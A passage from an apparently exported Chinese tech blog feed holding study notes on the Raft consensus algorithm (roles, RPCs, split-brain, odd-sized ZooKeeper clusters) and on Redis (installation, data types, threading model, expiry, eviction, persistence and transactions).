<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202272047300.jpg" alt="best_beaches_in_the_world-wallpaper-2880x1620"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202272047554.jpg" alt="very_nice_satellite_images_of_iran-wallpaper-2880x1620"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202272113875.JPG" alt="IMG_3460"></p>
]]></content>
      <categories>
        <category>base</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>Raft</title>
    <url>/2022/03/22/Raft/</url>
    <content><![CDATA[<h1 id="Raft"><a href="#Raft" class="headerlink" title="Raft"></a>Raft</h1><p><a href="http://thesecretlivesofdata.com/raft/">http://thesecretlivesofdata.com/raft/</a></p>
<h2 id="Raft概述"><a href="#Raft概述" class="headerlink" title="Raft概述"></a>Raft概述</h2><p>Raft节点有3种角色：</p>
<ul>
<li><strong>Leader</strong>：处理客户端读写、复制Log给Follower等。</li>
<li><strong>Candidate</strong>：竞选新的Leader(由Follower超时转换得来)。</li>
<li><strong>Follower</strong>：不发送任何请求，完全被动响应Leader、Candidate的RPC。</li>
</ul>
<p>Raft信息有3种RPC：</p>
<ul>
<li><p><strong>RequestVote RPC</strong>：由Candidate发出，用于发送投票请求。</p>
</li>
<li><p><strong>AppendEntries (Heartbeat) RPC</strong>：由Leader发出，用于Leader向Followers复制日志条目，也会用作Heartbeat（日志条目为空即为 Heartbeat）。</p>
</li>
<li><p><strong>InstallSnapshot RPC</strong>：由Leader发出，用于快照传输，虽然多数情况都是每个服务器独立创建快照，但是Leader有时候必须发送快照给一些落后太多的Follower，这通常发生在Leader已经丢弃了下一条要发给该Follower的日志条目(Log Compaction 时清除掉了的情况)。</p>
</li>
<li><p><strong>心跳超时</strong>：Leader周期性的向Follower发送心跳(0.5ms – 20ms)，如果Follower在<strong>选举超时</strong>时间内没有收到心跳，则触发选举。</p>
</li>
<li><p><strong>选举超时</strong>：如果存在两个或者多个节点选主，都没有拿到大多数节点的应答，需要重新选举，Raft引入随机的选举超时时间(150ms – 300ms)，避免选主活锁。</p>
</li>
</ul>
<h2 id="强一致性（线性一致性）"><a href="#强一致性（线性一致性）" class="headerlink" title="强一致性（线性一致性）"></a>强一致性（线性一致性）</h2><p>所谓的强一致性（线性一致性）并不是指集群中所有节点在任一时刻的状态必须完全一致，而是指一个目标，即让一个分布式系统看起来只有一个数据副本，并且读写操作都是原子的，这样应用层就可以忽略系统底层多个数据副本间的同步问题。也就是说，可以将一个强一致性分布式系统当成一个整体，一旦某个客户端成功的执行了写操作，那么所有客户端都一定能读出刚刚写入的值。即使发生网络分区故障，或者少部分节点发生异常，整个集群依然能够像单机一样提供服务。</p>
<h2 id="共识算法"><a href="#共识算法" class="headerlink" title="共识算法"></a>共识算法</h2><p>共识算法通常基于状态复制机（Replicated State Machine）模型，也就是所有节点从同一个 state 出发，经过同样的操作 log，最终达到一致的 state。</p>
<p>共识算法是构建强一致性分布式系统的基石，Paxos 是共识算法的代表，而 Raft 则是其作者在博士期间研究 Paxos 时提出的一个变种，主要优点是容易理解、易于实现，甚至关键的部分都在论文中给出了伪代码实现。</p>
<h2 id="TiKV"><a href="#TiKV" class="headerlink" title="TiKV"></a>TiKV</h2><p>TiKV 是一个分布式事务型的键值数据库，提供了满足 ACID 约束的分布式事务接口，并且通过 Raft 协议保证了多副本数据一致性以及高可用。TiKV 作为 TiDB 的存储层，为用户写入 TiDB 的数据提供了持久化以及读写服务，同时还存储了 TiDB 的统计信息数据。</p>
<h2 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h2><h3 id="日志无限增长问题"><a href="#日志无限增长问题" class="headerlink" title="日志无限增长问题"></a>日志无限增长问题</h3><p>Raft 将操作包装成为了日志，集群每个节点都维护了一个不断增长的日志序列，状态机只有通过重放日志序列来得到。但由于这个日志序列可能会随着时间流逝不断增长，因此必须有一些办法来避免无休止的磁盘占用和过久的日志重放。这一部分叫<strong>日志压缩</strong>（<strong>Log compaction</strong>）。</p>
<h3 id="集群成员变更问题"><a href="#集群成员变更问题" class="headerlink" title="集群成员变更问题"></a>集群成员变更问题</h3><p>一个 Raft 集群不太可能永远是固定几个节点，总有扩缩容的需求，或是节点宕机需要替换的时候。直接更换集群成员可能会导致严重的<strong>脑裂</strong>问题。Raft 给出了一种安全变更集群成员的方式。这一部分叫<strong>集群成员变更</strong>（<strong>Cluster membership change</strong>）。</p>
<h2 id="在进行一致性复制的过程中-假如出现了异常情况，raft都是如何处理的呢？"><a href="#在进行一致性复制的过程中-假如出现了异常情况，raft都是如何处理的呢？" class="headerlink" title="在进行一致性复制的过程中,假如出现了异常情况，raft都是如何处理的呢？"></a>在进行一致性复制的过程中,假如出现了异常情况，raft都是如何处理的呢？</h2><p>1.数据到达 Leader 节点前，这个阶段 Leader 挂掉不影响一致性</p>
<p>2.数据到达 Leader 节点，但未复制到 Follower 节点。这个阶段 Leader 挂掉，数据属于未提交状态，Client 不会收到 Ack 会认为超时失败可安全发起重试。</p>
<p>3.数据到达 Leader 节点，成功复制到 Follower 所有节点，但 Follower 还未向 Leader 响应接收。这个阶段 Leader 挂掉，虽然数据在 Follower 节点处于未提交状态（Uncommitted），还是是保持一致的。重新选出 Leader 后可完成数据提交。</p>
<p>4.数据到达 Leader 节点，成功复制到 Follower 的部分节点，但这部分 Follower 节点还未向 Leader 响应接收。这个阶段 Leader 挂掉，数据在 Follower 节点处于未提交状态（Uncommitted）且不一致。</p>
<p>Raft 协议要求投票只能投给拥有最新数据的节点。所以拥有最新数据的节点会被选为 Leader，然后再强制同步数据到其他 Follower，保证数据不会丢失并最终一致。</p>
<p>5.数据到达 Leader 节点，成功复制到 Follower 所有或多数节点，数据在 Leader 处于已提交状态，但在 Follower 处于未提交状态。</p>
<p>这个阶段 Leader 挂掉，重新选出新的 Leader 后的处理流程和阶段 3 一样。</p>
<p>6.数据到达 Leader 节点，成功复制到 Follower 所有或多数节点，数据在所有节点都处于已提交状态，但还未响应 Client。这个阶段Leader挂掉，集群内部数据其实已经是一致的，Client 重复重试基于幂等策略对一致性无影响。</p>
<h2 id="脑裂问题"><a href="#脑裂问题" class="headerlink" title="脑裂问题"></a>脑裂问题</h2><p>当raft在集群中遇见网络分区的时候,集群就会因此而相隔开,在不同的网络分区里会因为无法接收到原来的leader发出的心跳而超时选主,这样就会造成多leader现象,见下图：在网络分区1和网络分区2中，出现了两个leaderA和D,假设此时要更新分区2的值,因为分区2无法得到集群中的大多数节点的ACK,会复制失败。而网络分区1会成功,因为分区1中的节点更多,leaderA能得到大多数回应</p>
<p>当网络恢复的时候,集群不再是双分区,raft会有如下操作：</p>
<ul>
<li><p>leaderD发现自己的Term小于LeaderA,会自动下台(step down)成为follower,leaderA保持不变依旧是集群中的主leader角色</p>
</li>
<li><p>分区中的所有节点会回滚roll back自己的数据日志,并匹配新leader的log日志,然后实现同步提交更新自身的值。通知旧leaderA也会主动匹配主leader节点的最新值,并加入到follower中</p>
</li>
<li><p>最终集群达到整体一致，集群存在唯一leader（节点A）</p>
</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202203221611902.png" alt="img"></p>
<p>只是分区1可以提供读写服务，分区二只能提供读服务，并且数据和分区1不一致。</p>
<h3 id="极端情况"><a href="#极端情况" class="headerlink" title="极端情况"></a>极端情况</h3><p><img src="https://img-blog.csdnimg.cn/20191219100307323.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3p4eWx3ag==,size_16,color_FFFFFF,t_70" alt="img"></p>
<p>脑裂问题出现后，即便网络恢复，集群也无法自我恢复，需要人工重启解决现有状态。</p>
<h2 id="Zookeeper集群节点为什么要部署成奇数"><a href="#Zookeeper集群节点为什么要部署成奇数" class="headerlink" title="Zookeeper集群节点为什么要部署成奇数"></a>Zookeeper集群节点为什么要部署成奇数</h2><p>zookeeper 容错指的是：当宕掉几个 zookeeper 节点服务器之后，剩下的个数必须大于宕掉的个数，也就是剩下的节点服务数必须大于 n&#x2F;2，这样 zookeeper 集群才可以继续使用，无论奇偶数都可以选举 leader。例如5台 zookeeper 节点机器最多宕掉 2 台，还可以继续使用，因为剩下 3 台大于 5&#x2F;2。那么为什么最好为奇数个节点呢？是在以最大容错服务器个数的条件下，会节省资源。比如，最大容错为 2 的情况下，对应的zookeeper 服务数，奇数为5，而偶数为6，也就是6个zookeeper 服务的情况下最多能宕掉2个服务，所以从节约资源的角度看，没必要部署6（偶数）个 zookeeper 服务节点。</p>
<p>zookeeper 集群有这样一个特性：集群中只要有过半的机器是正常工作的，那么整个集群对外就是可用的。也就是说如果有 2 个 zookeeper 节点，那么只要有1个zookeeper 节点死了，那么 zookeeper 服务就不能用了，因为1没有过半，所以2个 zookeeper 的死亡容忍度为0；同理，要是有3个 zookeeper，一个死了，还剩下2个正常的，过半了，所以3个 zookeeper 的容忍度为1；同理也可以多列举几个：2-&gt;0; 3-&gt;1; 4-&gt;1; 5-&gt;2; 6-&gt;2 就会发现一个规律，2n 和 2n-1 的容忍度是一样的，都是 n-1，所以为了更加高效，何必增加那一个不必要的 zookeeper 呢。</p>
<p>根据以上可以得出结论：从资源节省的角度来考虑，zookeeper 集群的节点最好要部署成奇数个！</p>
]]></content>
      <categories>
        <category>base</category>
      </categories>
      <tags>
        <tag>Raft</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis</title>
    <url>/2022/02/26/Redis/</url>
    <content><![CDATA[<p>[TOC]</p>
<h1 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h1><p>epoll-wait redis不阻塞， nginx会阻塞，因为mater负责连接，worker工作，所以不需要非阻塞。</p>
<p>采用弱一致性，因为是缓存。</p>
<p>最终一致性（没有用这种）。</p>
<p>做云原生，动态扩缩容，需要服务无状态，随意加服务器。</p>
<h2 id="Redis-6-2-2-安装"><a href="#Redis-6-2-2-安装" class="headerlink" title="Redis 6.2.2 安装"></a>Redis 6.2.2 安装</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">下载和编译的过程</span></span><br><span class="line">wget https://download.redis.io/releases/redis-6.2.2.tar.gz</span><br><span class="line">tar xzf redis-6.2.2.tar.gz</span><br><span class="line">cd redis-6.2.2 &amp;&amp; vi README.md</span><br><span class="line">make</span><br><span class="line">yum install gcc -y</span><br><span class="line">make distclean</span><br><span class="line">make</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装过程</span></span><br><span class="line">make PREFIX=/opt/bigdata/redis6 install</span><br><span class="line">vi /etc/profile</span><br><span class="line">export REDIS_HOME=/opt/bigdata/redis6</span><br><span class="line">export PATH=$PATH:$REDIS_HOME/bin</span><br><span class="line"></span><br><span class="line">source /etc/profile</span><br><span class="line">cd utils</span><br><span class="line">./install_server.sh</span><br></pre></td></tr></table></figure>

<h2 id="Redis简介"><a href="#Redis简介" class="headerlink" title="Redis简介"></a>Redis简介</h2><p>使用c语言开发的数据库，数据存在内存中，读写速度非常快。</p>
<p>redis被广泛应用在缓存方向，分布式锁， 甚至消息队列。 </p>
<p>支持事务，持久化，lua脚本和多种集群方案。</p>
<h2 id="分布式缓存常见技术选型方案有哪些"><a href="#分布式缓存常见技术选型方案有哪些" class="headerlink" title="分布式缓存常见技术选型方案有哪些?"></a>分布式缓存常见技术选型方案有哪些?</h2><p>Memcached和redis , 分布式缓存主要解决单机缓存的容量受服务器限制并且无法保存通用信息的问题。</p>
<p>本地缓存只在当前服务有效，如果你部署了两个相同的服务，他们两者之间的缓存数据是无法共通的。</p>
<h2 id="Redis和Memcached"><a href="#Redis和Memcached" class="headerlink" title="Redis和Memcached"></a>Redis和Memcached</h2><p><strong>相同点:</strong> </p>
<ul>
<li><p>基于内存，用作缓存。</p>
</li>
<li><p>都有过期策略。</p>
</li>
<li><p>性能都比较高。</p>
</li>
</ul>
<p><strong>区别:</strong> </p>
<ul>
<li><p>redis支持更丰富的数据类型，例如：string， list，hash，set，sorted set，bitmap； m只支持最简单的k&#x2F;v数据类型。</p>
</li>
<li><p>redis支持持久化； redis有容灾恢复机制，因为可以持久化； m在服务器内存用完后报异常，redis可以将不用的数据放到磁盘。 </p>
</li>
<li><p>redis原生支持cluster模式； m不行，得靠客户端来实现往集群中分片写入数据。 </p>
</li>
<li><p>redis使用单线程多路io复用模型（redis6 引入多线程io，默认是关闭的）， m是多线程非阻塞io复用模型。</p>
</li>
<li><p>redis支持发布订阅模型，lua脚本，事务等特性，而m不支持， redis还支持更多的编程语言。</p>
</li>
<li><p>redis过期删除策略同时使用惰性删除和定期删除，而m只用惰性删除。</p>
</li>
<li><p>redis计算向数据移动，能直接取到字符串中的某个值，而m只会返回整个数组，浪费网络io资源。</p>
</li>
</ul>
<h2 id="为什么要用缓存-redis"><a href="#为什么要用缓存-redis" class="headerlink" title="为什么要用缓存(redis)"></a>为什么要用缓存(redis)</h2><p>高性能，高并发， mysql qps 1w（4核8g）, 用redis能到10w+，甚至30w+(单机)。</p>
<h2 id="Redis常用数据结构"><a href="#Redis常用数据结构" class="headerlink" title="Redis常用数据结构"></a>Redis常用数据结构</h2><h3 id="String"><a href="#String" class="headerlink" title="String"></a>String</h3><p>set mset mget get strlen exists  incr setex del expire setex ttl</p>
<p>需要计数的场景，用户访问次数，热点文章的点赞转发数量等。</p>
<h3 id="List"><a href="#List" class="headerlink" title="List"></a>List</h3><p>rpush pop plush pop lrange llen</p>
<p>双向链表，发布与订阅或者消息队列，慢查询。</p>
<h3 id="Hash"><a href="#Hash" class="headerlink" title="Hash"></a>Hash</h3><p>hset hmset exists hget hgetall keys hvals; hashmap</p>
<p>系统中的对象存储。</p>
<h3 id="Set"><a href="#Set" class="headerlink" title="Set"></a>Set</h3><p>sadd spop smembers sismember scard sinterstore sunion</p>
<p>需要存放的数据不能重复以及需要获取多个数据源交集和并集等场景， 共同好友（交集）， 推荐好友（差集），尽量不用，交集和差集都比较耗时。</p>
<h3 id="Sorted-set"><a href="#Sorted-set" class="headerlink" title="Sorted set"></a>Sorted set</h3><p>zadd zcard score range zrevrange zrem</p>
<p>通过设置的权重排序，默认升序，权重一样则按acsii码排序。需要对数据根据某个权重进行排序的场景，比如直播系统中，实时排行信息包含直播间在线用户列表，各种礼物排行榜，弹幕消息（可以理解为按消息维度的消息排行榜）等信息。 </p>
<h3 id="Bitmap"><a href="#Bitmap" class="headerlink" title="Bitmap"></a>Bitmap</h3><p>setbit getbit bitcount bitop</p>
<p>是否签到，是否登录，活跃用户情况，用户行为统计（是否点赞过某个视频）。 </p>
<h2 id="Skiplist跳表-zset"><a href="#Skiplist跳表-zset" class="headerlink" title="Skiplist跳表(zset)"></a>Skiplist跳表(zset)</h2><p>查询是否为skiplist：OBJECT encoding k1。</p>
<p>数据很少为ziplist，数据多的话会变为skiplist。</p>
<p>最高32层，跳表就是链表与二分法的结合，链表从头节点到尾节点都是有序的。</p>
<p>可以进行跳跃查找（形如二分法），降低时间复杂度。</p>
<p>建立索引使用抛硬币的方式决定，每个节点有50%概率会被提拔，大体上索引是均匀的。 </p>
<p>删除是(O(n))时，自上向下， 查找第一次出现节点的索引，并逐层找到每一层对应的节点，如果该层只有一个节点，则删除整层。 </p>
<p>相比于二叉查找树，跳表维持结构平衡的成本比较低，完全靠随机。而二叉查找树需要Rebalance来重新调整平衡的结构</p>
<h2 id="Redis单线程模型详解"><a href="#Redis单线程模型详解" class="headerlink" title="Redis单线程模型详解"></a>Redis单线程模型详解</h2><p><strong>Redis 基于 Reactor 模式来设计开发了自己的一套高效的事件处理模型</strong> （Netty 的线程模型也基于 Reactor 模式，Reactor 模式是高性能 IO 的基石），这套事件处理模型对应的是 Redis 中的文件事件处理器（file event handler）。由于文件事件处理器（file event handler）是单线程方式运行的，所以一般都说 Redis 是单线程模型。</p>
<p><strong>既然是单线程，那怎么监听大量的客户端连接呢？</strong></p>
<p>Redis 通过<strong>IO 多路复用程序</strong> 来监听来自客户端的大量连接（或者说是监听多个 socket），它会将感兴趣的事件及类型（读、写）注册到内核中并监听每个事件是否发生。</p>
<p>这样的好处非常明显： I&#x2F;O 多路复用技术的使用让 Redis 不需要额外创建多余的线程来监听客户端的大量连接，降低了资源的消耗（和 NIO 中的 Selector 组件很像）。</p>
<p>另外， Redis 服务器是一个事件驱动程序，服务器需要处理两类事件： 1. 文件事件；2. 时间事件。</p>
<p>时间事件不需要多花时间了解，接触最多的还是<strong>文件事件</strong>（客户端进行读取写入等操作，涉及一系列网络通信）。</p>
<p>《Redis 设计与实现》：</p>
<blockquote>
<p>Redis 基于 Reactor 模式开发了自己的网络事件处理器：这个处理器被称为文件事件处理器（file event handler）。文件事件处理器使用 I&#x2F;O 多路复用（multiplexing）程序来同时监听多个套接字，并根据套接字目前执行的任务来为套接字关联不同的事件处理器。</p>
<p>当被监听的套接字准备好执行连接应答（accept）、读取（read）、写入（write）、关 闭（close）等操作时，与操作相对应的文件事件就会产生，这时文件事件处理器就会调用套接字之前关联好的事件处理器来处理这些事件。</p>
<p><strong>虽然文件事件处理器以单线程方式运行，但通过使用 I&#x2F;O 多路复用程序来监听多个套接字</strong>，文件事件处理器既实现了高性能的网络通信模型，又可以很好地与 Redis 服务器中其他同样以单线程方式运行的模块进行对接，这保持了 Redis 内部单线程设计的简单性。</p>
</blockquote>
<p>可以看出，文件事件处理器（file event handler）主要是包含 4 个部分：</p>
<ul>
<li>多个 socket（客户端连接）</li>
<li>IO 多路复用程序（支持多个客户端连接的关键）</li>
<li>文件事件分派器（将 socket 关联到相应的事件处理器）</li>
<li>事件处理器（连接应答处理器、命令请求处理器、命令回复处理器）</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202261423312.png" alt="redis事件处理器"></p>
<h3 id="Redis单线程的注意事项"><a href="#Redis单线程的注意事项" class="headerlink" title="Redis单线程的注意事项"></a>Redis单线程的注意事项</h3><p>最好禁用像getAll这种的命令，这类命令耗时很久。</p>
<h2 id="Reactor"><a href="#Reactor" class="headerlink" title="Reactor"></a>Reactor</h2><p>单Reactor单线程</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202261423695.png" alt="img"></p>
<p>多线程的Reactor</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202261423746.png" alt="img"></p>
<p>主从Reactor多线程</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202261424051.png" alt="img"></p>
<h2 id="Redis为什么不使用多线程"><a href="#Redis为什么不使用多线程" class="headerlink" title="Redis为什么不使用多线程?"></a>Redis为什么不使用多线程?</h2><p>Redis4.0 增加的多线程主要是针对一些大键值对的删除操作的命令，使用这些命令就会使用主线程之外的其他线程来“异步处理”。 例如 UNLINK、FLUSHALL ASYNC、FLUSHDB ASYNC 等非阻塞的删除操作。对于 Redis 中的一些超大键值对，几十 MB 或者几百 MB 的数据并不能在几毫秒的时间内处理完，Redis 可能会需要在释放内存空间上消耗较多的时间，这些操作就会阻塞待处理的任务，影响 Redis 服务处理请求的速度和可用性。</p>
<p>单线程编程容易并且更容易维护，省去了很多上下文切换线程的时间。</p>
<p>Redis的性能瓶颈不在CPU，主要在内存和网络。</p>
<p>多线程就会存在死锁、线程上下文切换等问题，甚至会影响性能。</p>
<p><strong>1.官方答案</strong></p>
<p>因为Redis是基于内存的操作，CPU不是Redis的瓶颈，Redis的瓶颈最有可能是机器内存的大小或者网络带宽。既然单线程容易实现，而且CPU不会成为瓶颈，那就顺理成章地采用单线程的方案了。</p>
<p><strong>2.性能指标</strong></p>
<p>关于redis的性能，普通笔记本轻松处理每秒几十万的请求。</p>
<p><strong>3.详细原因</strong></p>
<p><strong>1）不需要各种锁的性能消耗</strong></p>
<p>Redis的数据结构并不全是简单的Key-Value，还有list，hash等复杂的结构，这些结构有可能会进行很细粒度的操作，比如在很长的列表后面添加一个元素，在hash当中添加或者删除一个对象。这些操作可能就需要加非常多的锁，导致的结果是同步开销大大增加。</p>
<p>在单线程的情况下，就不用去考虑各种锁的问题，不存在加锁释放锁操作，没有因为可能出现死锁而导致的性能消耗。</p>
<p><strong>2）单线程多进程集群方案</strong></p>
<p>单线程的威力实际上非常强大，每核心效率也非常高，多线程自然是可以比单线程有更高的性能上限，但是在今天的计算环境中，即使是单机多线程的上限也往往不能满足需要了，需要进一步摸索的是多服务器集群化的方案，这些方案中多线程的技术照样是用不上的。</p>
<p><strong>所以单线程、多进程的集群不失为一个时髦的解决方案。</strong></p>
<p><strong>3）CPU消耗</strong></p>
<p>采用单线程，避免了不必要的上下文切换和竞争条件，也不存在多进程或者多线程导致的切换而消耗 CPU。</p>
<p>但是如果CPU成为Redis瓶颈，或者不想让服务器其他CUP核闲置的话，可以考虑多起几个Redis进程，Redis是key-value数据库，不是关系数据库，数据之间没有约束。只要客户端分清哪些key放在哪个Redis进程上就可以了。</p>
<h2 id="Redis6为什么引入多线程"><a href="#Redis6为什么引入多线程" class="headerlink" title="Redis6为什么引入多线程?"></a>Redis6为什么引入多线程?</h2><p>主要是为了提高网络IO读写性能，因为这个算是Redis中的一个性能瓶颈。Redis的多线程只是在网络数据的读写这类耗时操作上使用， 执行命令仍然是单线程顺序执行，因此不需要担心线程安全问题。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">4核建议设置2-3个线程，8核设置6个线程</span></span><br><span class="line">io-threads-do-reads yes  io-threads 4 </span><br></pre></td></tr></table></figure>

<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202261424062.png" alt="下载"></p>
<h2 id="Redis给缓存数据设置过期时间有啥用"><a href="#Redis给缓存数据设置过期时间有啥用" class="headerlink" title="Redis给缓存数据设置过期时间有啥用"></a>Redis给缓存数据设置过期时间有啥用</h2><ul>
<li><p>内存有限</p>
</li>
<li><p>业务需求，例如短信验证码1分钟有效， jwt30分钟有效。</p>
</li>
</ul>
<h2 id="Redis是如何判断数据是否过期的"><a href="#Redis是如何判断数据是否过期的" class="headerlink" title="Redis是如何判断数据是否过期的?"></a>Redis是如何判断数据是否过期的?</h2><p>用过期字典（类似hash表）来保存。过期字典的键指向 Redis 数据库中的某个 key(键)，过期字典的值是一个 long long 类型的整数，这个整数保存了 key 所指向的数据库键的过期时间（毫秒精度的 UNIX 时间戳）。</p>
<p>通过查询过期字典，检查下面的条件判断是否过期：</p>
<ol>
<li>检查给定的键是否在过期字典中，如果存在就获取键的过期时间。</li>
<li>检查当前 UNIX 时间戳是否大于键的过期时间，是就过期，否则未过期。</li>
</ol>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202261424468.png" alt="redis过期时间"></p>
<h2 id="Redis删除策略"><a href="#Redis删除策略" class="headerlink" title="Redis删除策略?"></a>Redis删除策略?</h2><p>惰性删除：只会在取出key的时候才对数据进行过期检查。这样对CPU最友好，但是可能会造成大量的过期key没有被删除。</p>
<p>定期删除：每隔一段时间抽取出一批key执行删除过期key操作。并且，Redis底层会通过限制删除操作执行的时长和频率来减少删除操作对CPU时间的影响。</p>
<p>定期删除对内存友好，惰性删除对CPU友好，Redis采用定期删除+ 惰性删除的方式。</p>
<h2 id="Redis内存淘汰机制"><a href="#Redis内存淘汰机制" class="headerlink" title="Redis内存淘汰机制?"></a>Redis内存淘汰机制?</h2><p>仅仅通过给 key 设置过期时间还是有问题的，因为还是可能存在定期删除和惰性删除漏掉了很多过期 key 的情况。这样就导致大量过期 key 堆积在内存里，然后就 Out of memory 了。</p>
<p>通过Redis 内存淘汰机制可以解决这个问题。</p>
<p>Redis 提供 6 种数据淘汰策略：</p>
<ol>
<li><strong>volatile-lru（least recently used）</strong>：从已设置过期时间的数据集（server.db[i].expires）中挑选最近最少使用的数据淘汰。</li>
<li><strong>volatile-ttl</strong>：从已设置过期时间的数据集（server.db[i].expires）中挑选将要过期的数据淘汰。</li>
<li><strong>volatile-random</strong>：从已设置过期时间的数据集（server.db[i].expires）中任意选择数据淘汰。</li>
<li><strong>allkeys-lru（least recently used）</strong>：当内存不足以容纳新写入数据时，在键空间中，移除最近最少使用的 key（这个是最常用的）。</li>
<li><strong>allkeys-random</strong>：从数据集（server.db[i].dict）中任意选择数据淘汰。</li>
<li><strong>no-eviction</strong>：禁止驱逐数据，也就是说当内存不足以容纳新写入数据时，新写入操作会报错。这个几乎没有人使用。</li>
</ol>
<p>4.0 版本后增加以下两种：</p>
<ol>
<li><strong>volatile-lfu（least frequently used）</strong>：从已设置过期时间的数据集（server.db[i].expires）中挑选最不经常使用的数据淘汰。</li>
<li><strong>allkeys-lfu（least frequently used）</strong>：当内存不足以容纳新写入数据时，在键空间中，移除最不经常使用的 key。</li>
</ol>
<h2 id="Redis持久化"><a href="#Redis持久化" class="headerlink" title="Redis持久化"></a>Redis持久化</h2><p>一般不要开启持久化，存的是缓存，得看具体场景。</p>
<p>RDB（snapshotting）： Redis默认的持久化方式，恢复速度快缺失的也多。通过fork一个进程使用COW（Copy on write）来拍快照，主进程修改需要新开内存，然后修改指针，子进程拍的快照还是原来的数据。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">save 900 1           #在900秒(15分钟)之后，如果至少有1个key发生变化，Redis就会自动触发BGSAVE命令创建快照。</span><br><span class="line"></span><br><span class="line">save 300 10          #在300秒(5分钟)之后，如果至少有10个key发生变化，Redis就会自动触发BGSAVE命令创建快照。</span><br><span class="line"></span><br><span class="line">save 60 10000        #在60秒(1分钟)之后，如果至少有10000个key发生变化，Redis就会自动触发BGSAVE命令创建快照。</span><br></pre></td></tr></table></figure>

<p>AOF（append only file） ： appendonly yes，将命令都写入磁盘中的AOF文件。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">appendfsync always    #每次有数据修改发生时都会写入磁盘AOF文件，这样会严重降低Redis的速度。</span><br><span class="line">appendfsync everysec  #每秒钟同步一次，显示地将多个写命令同步到硬盘，每秒会刷新一次去磁盘AOF文件中，丢失小于一个buffer。</span><br><span class="line">appendfsync no        #让操作系统决定何时进行写回磁盘，可能会丢一个buffer。</span><br></pre></td></tr></table></figure>

<p>redis 4.0 支持混合模式（默认关闭，aof-use-rdb-preamble开启），快速加载同时避免丢失过多的数据，缺点是AOF里面的RDB部分是压缩格式不再是AOF格式，可读性差。</p>
<h2 id="AOF重写"><a href="#AOF重写" class="headerlink" title="AOF重写"></a>AOF重写</h2><p>AOF重写可以产生一个新的AOF文件，状态一样，体积更小。</p>
<p>执行 BGREWRITEAOF 命令时，Redis 服务器会维护一个 AOF 重写缓冲区，该缓冲区会在子进程创建新 AOF 文件期间，记录服务器执行的所有写命令。当子进程完成创建新 AOF 文件的工作之后，服务器会将重写缓冲区中的所有内容追加到新 AOF 文件的末尾，使得新旧两个 AOF 文件所保存的数据库状态一致。最后，服务器用新的 AOF 文件替换旧的 AOF 文件，以此来完成 AOF 文件重写操作。</p>
<h2 id="Redis-事务"><a href="#Redis-事务" class="headerlink" title="Redis 事务"></a>Redis 事务</h2><p>在第一个窗口，通过WATCH，监控data1，并开启事务，添加设置data2的命令到命令队列中。在第二个窗口修改data1， 执行EXEC命令。然后在窗口1执行EXEC命令，会返回了一个nil，获取data2的值，返回的也是nil。当被监控的数据发生改变后，开启的事务执行是无法成功的，只有被监控的数据不发生变化，事务才能正常执行。 </p>
<p>Redis 可以通过 <strong>MULTI，EXEC，DISCARD ，WATCH，UNWATCH</strong> 等命令来实现事务（transaction）功能。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt; MULTI</span><br><span class="line">OK</span><br><span class="line">&gt; INCR foo</span><br><span class="line">QUEUED</span><br><span class="line">&gt; INCR bar</span><br><span class="line">QUEUED</span><br><span class="line">&gt; EXEC</span><br><span class="line">1) (<span class="built_in">integer</span>) 1</span><br><span class="line">2) (<span class="built_in">integer</span>) 1</span><br></pre></td></tr></table></figure>

<p>使用 MULTI命令后可以输入多个命令。Redis 不会立即执行这些命令，而是将它们放到队列，当调用了EXEC命令将执行所有命令。</p>
<p>但是，Redis 的事务和关系型数据库的事务不同。事务具有四大特性： <strong>1. 原子性</strong>，<strong>2. 隔离性</strong>，<strong>3. 持久性</strong>，<strong>4. 一致性</strong>。</p>
<ol>
<li><strong>原子性（Atomicity）：</strong> 事务是最小的执行单位，不允许分割。事务的原子性确保动作要么全部完成，要么完全不起作用；</li>
<li><strong>隔离性（Isolation）：</strong> 并发访问数据库时，一个用户的事务不被其他事务所干扰，各并发事务之间数据库是独立的；</li>
<li><strong>持久性（Durability）：</strong> 一个事务被提交之后。它对数据库中数据的改变是持久的，即使数据库发生故障也不应该对其有任何影响。</li>
<li><strong>一致性（Consistency）：</strong> 执行事务前后，数据保持一致，多个事务对同一个数据读取的结果是相同的；</li>
</ol>
<p><strong>Redis 是不支持 roll back 的，因而不满足原子性的（而且不满足持久性）。</strong></p>
<p> Redis 开发者们觉得没必要支持回滚，这样更简单便捷并且性能更好。Redis 开发者觉得即使命令执行错误也应该在开发过程中就被发现而不是生产过程中。</p>
<p>可以将 Redis 中的事务就理解为 ：<strong>Redis 事务提供了一种将多个命令请求打包的功能。然后，再按顺序执行打包的所有命令，并且不会被中途打断。</strong></p>
